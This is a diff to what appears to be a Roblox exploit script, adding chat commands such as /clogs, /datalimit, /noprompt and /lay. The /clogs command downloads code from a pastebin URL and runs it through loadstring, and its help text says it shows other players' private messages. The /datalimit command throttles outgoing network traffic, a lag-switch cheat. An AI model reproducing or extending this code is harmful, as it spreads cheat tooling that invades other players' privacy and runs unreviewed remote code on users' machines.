@@ -17,6 +17,7 @@ local oofing = false
 local TeleportService = game:GetService("TeleportService")
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
 local CharInject = true
+local NetworkClient = game:GetService("NetworkClient")
 
 function ForceBodyPart()
 for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
@@ -1782,6 +1783,33 @@ if loopUse then
        loopUse:Disconnect()
 end
 end
+if cmd == "clogs" then
+loadstring(game:HttpGet("https://pastebin.com/raw/CB3Jghvb"))()
+end
+if cmd == "datalimit" then
+local var = string.sub(msg,space+1)
+if tonumber(var) then
+		NetworkClient:SetOutgoingKBPSLimit(var)
+	end
+end
+if cmd == "noprompt" then
+COREGUI.PurchasePrompt.Enabled = false
+end
+if cmd == "prompt" then
+COREGUI.PurchasePrompt.Enabled = true
+end
+if cmd == "lay" then
+local Human = speaker.Character and speaker.Character:FindFirstChildOfClass('Humanoid')
+	if not Human then
+		return
+	end
+	Human.Sit = true
+	task.wait(.1)
+	Human.RootPart.CFrame = Human.RootPart.CFrame * CFrame.Angles(math.pi * .5, 0, 0)
+	for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
+		v:Stop()
+	end
+end
 -- limits
 end
 end)
@@ -1857,6 +1885,11 @@ cmds[#cmds + 1] = {Text = "[64] /antifling",Title = "Prevents you from being hit
 cmds[#cmds + 1] = {Text = "[65] /cammode [tpp or fpp]",Title = "Camera mode."}
 cmds[#cmds + 1] = {Text = "[66] /usetool",Title = "hold the objects in your inventory"}
 cmds[#cmds + 1] = {Text = "[67] /unusetool",Title = "{}"}
+cmds[#cmds + 1] = {Text = "[68] /clogs",Title = "u can see all private message"}
+cmds[#cmds + 1] = {Text = "[69] /datalimit [number]",Title = "set data limit"}
+cmds[#cmds + 1] = {Text = "[70] /noprompt",Title = "hide all purchase prompt"}
+cmds[#cmds + 1] = {Text = "[71] /prompt",Title = "show all purchase prompt"}
+cmds[#cmds + 1] = {Text = "[72] /lay",Title = "sleep"}
 
 for v = 1, #cmds do
 -- for _,v in next, #cmds do
